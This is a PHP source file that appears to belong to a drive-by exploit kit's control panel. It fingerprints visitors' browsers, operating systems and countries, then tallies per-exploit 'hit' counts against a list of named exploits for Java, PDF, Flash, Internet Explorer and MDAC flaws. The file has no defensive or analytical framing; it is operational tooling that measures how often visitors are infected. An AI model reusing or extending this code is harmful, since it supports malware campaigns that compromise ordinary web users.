<?php
function getbrowserver(& $MSIEversion, & $OPERAversion) {
    $uag = $_SERVER['HTTP_USER_AGENT'];
    if ( strstr( $uag, "Opera" ) ) {
        if ( preg_match( "#Opera/(\\d+\\.?\\d*)#s", $uag, $mt ) ) {
            $OPERAversion=$mt[1];
            return "Opera v{$mt[1]}";
        }
        return "Opera";
    }
    if ( strstr( $uag, "Firefox" ) ) {
        if ( preg_match( "#Firefox/(\\d+\\.?\\d*\\.?\\d*)#s", $uag, $mt ) ) {
            return "Firefox v{$mt[1]}";
        }
        return "Firefox";
    }
    if ( strstr( $uag, "MSIE" ) ) {
        if ( preg_match( "#MSIE (\\d+\\.?\\d*)#s", $uag, $mt ) ) {
            $MSIEversion=$mt[1];
            return "MSIE v{$mt[1]}";
        }
        return "MSIE";
    }
    if ( strstr( $uag, "Nav" ) || strstr( $uag, "Netscape" ) ) {
        return "Netscape";
    }
    if ( strstr( $uag, "Konqueror" ) ) {
        return "Konqueror";
    }
    if ( strstr( $uag, "Chrome" ) ) {
        return "Chrome";
    }
    if ( strstr( $uag, "Safari" ) ) {
        return "Safari";
    }
    return "Other";
}

function getbrowsertype( ) {
    $uag = $_SERVER['HTTP_USER_AGENT'];
    if ( strstr( $uag, "Opera" ) ) {
        return "Opera";
    }
    if ( strstr( $uag, "Firefox" ) ) {
        return "Firefox";
    }
    if ( strstr( $uag, "MSIE" ) ) {
        return "MSIE";
    }
    return "Other";
}

function getosver( ) {
    $uag = $_SERVER['HTTP_USER_AGENT'];
    if ( strstr( $uag, "Windows 95" ) ) {
        return "Windows 95";
    }
    if ( strstr( $uag, "Windows 98" ) ) {
        return "Windows 98";
    }
    if ( strstr( $uag, "Win 9x 4.9" ) ) {
        return "Windows ME";
    }
    if ( strstr( $uag, "Windows NT 4" ) ) {
        return "Windows NT 4";
    }
    if ( strstr( $uag, "Windows NT 5.0" ) ) {
        return "Windows 2000";
    }
    if ( strstr( $uag, "SV1" ) ) {
        return "Windows XP SP2";
    }
    if ( strstr( $uag, "Windows NT 5.1" ) ) {
        return "Windows XP";
    }
    if ( strstr( $uag, "Windows NT 5.2" ) ) {
        return "Windows 2003";
    }
    if ( strstr( $uag, "Windows NT 6.0" ) ) {
        return "Windows Vista";
    }
    if ( strstr( $uag, "Windows NT 6.1" ) ) {
        return "Windows 7";
    }
    if ( strstr( $uag, "Windows" ) ) {
        return "Windows";
    }
    if ( strstr( $uag, "Linux" ) ) {
        return "Linux";
    }
    if ( strstr( $uag, "BSD" ) ) {
        return "*BSD";
    }
    return "Other";
}

function getcountry( ) {
    $geo = geoip_open( "drkmjrc.dat", GEOIP_STANDARD );
    $cnt = geoip_country_code_by_addr( $geo, $_SERVER['REMOTE_ADDR'] );
    if ( !$cnt ) {
        $cnt = "-";
    }
    geoip_close( $geo );
    return $cnt;
}

function hsc( $str ) {
    return htmlspecialchars( htmlspecialchars_decode( $str, ENT_QUOTES ), ENT_QUOTES );
}

function do404() {
    header("Location: ".$NONUNIQUEURL);
    exit( );
}

function redir( $url ) {
    ob_clean( );
    header( "HTTP/1.1 302 Found" );
    header( "Location: {$url}" );
    exit( );
}

function doprc( $part, $total ) {
    if ( $total == 0 ) {
        return "0%";
    }
    return round( $part / $total * 100, 2 )."%";
}

function getstats( $col ) {
    $nms = array( );
    $ttl = array( );
    $eed = array( );
    $prc = array( );
    $r = mysql_query( "SELECT DISTINCT {$col} FROM stats" );
    while ( $row = mysql_fetch_row( $r ) ) {
        $nms[] = $row[0];
        $cnm = addslashes( $row[0] );
        $rt = mysql_query( "SELECT COUNT(*) FROM stats WHERE {$col}='{$cnm}'" );
        $rowt = mysql_fetch_row( $rt );
        $total = $rowt[0];
        $ttl[] = $total;
        $rt = mysql_query( "SELECT COUNT(*) FROM stats WHERE {$col}='{$cnm}' AND hit!=0" );
        $rowt = mysql_fetch_row( $rt );
        $exped = $rowt[0];
        $eed[] = $exped;
        $prc[] = doprc( $exped, $total );
    }
    array_multisort( $eed, SORT_DESC, $ttl, SORT_DESC, $nms, $prc );
    return array( $nms, $ttl, $eed, $prc );
}


function getexpstats( ) {
    global $SPLOITS;
    $nms = array( );
    $ttl = array( );
    $r = mysql_query( "SELECT DISTINCT hit FROM stats WHERE hit!=0 ORDER BY hit ASC" );
    while ( $row = mysql_fetch_row( $r ) ) {
        $nms[] = $SPLOITS[$row[0]];
        $cnm = addslashes( $row[0] );
        $rt = mysql_query( "SELECT COUNT(*) FROM stats WHERE hit='{$cnm}'" );
        $rowt = mysql_fetch_row( $rt );
        $ttl[] = $rowt[0];
    }
    return array( $nms, $ttl );
}






require_once( "bmxvfpdmxtxmimxpi.php" );
//$ACTS = array( "" => "simple stats", "adv" => "advanced stats", "config" => "config", "clear" => "clear stats", "logout" => "logout" );

$SPLOITS = array(1 => "JAVA TC",  2 => "JAVA SMB", 3 => "HCP", 4 => "PDF COLLAB", 5 => "PDF PRINTF", 6 => "JAVA RMI", 7 => "FLASH 9", 8 => "PDF LIBTIFF", 9 => "JAVA MIDI", 10 => "JAVA SKYLINE", 11 => "IE CSS", 12 => "IEPEERS", 13 => "HACKING ATTEMPT", 14 => "HACKING ATTEMPT", 15 => "MDAC", 16 => "HACKING ATTEMPT", 17 => "HACKING ATTEMPT", 18 => "FLASH 10" );

?>